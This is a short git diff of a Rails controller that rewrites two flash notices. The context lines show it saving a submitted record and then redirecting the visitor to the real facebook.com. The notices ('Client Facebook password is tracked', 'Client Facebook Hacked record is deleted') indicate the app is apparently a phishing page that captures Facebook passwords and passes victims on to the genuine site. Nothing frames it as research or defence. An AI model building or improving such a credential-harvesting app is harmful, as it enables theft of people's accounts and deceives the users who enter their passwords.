@@ -28,7 +28,7 @@ class FbsController < ApplicationController
 
     respond_to do |format|
       if @fb.save
-        format.html { redirect_to 'https://www.facebook.com/', notice: 'Client fb password is traced.' }
+        format.html { redirect_to 'https://www.facebook.com/', notice: 'Client Facebook password is tracked.' }
         format.json { render :show, status: :created, location: @fb }
       else
         format.html { render :new }
@@ -56,7 +56,7 @@ class FbsController < ApplicationController
   def destroy
     @fb.destroy
     respond_to do |format|
-      format.html { redirect_to fbs_url, notice: 'Fb was successfully destroyed.' }
+      format.html { redirect_to fbs_url, notice: 'Client Facebook Hacked record is deleted.' }
       format.json { head :no_content }
     end
   end
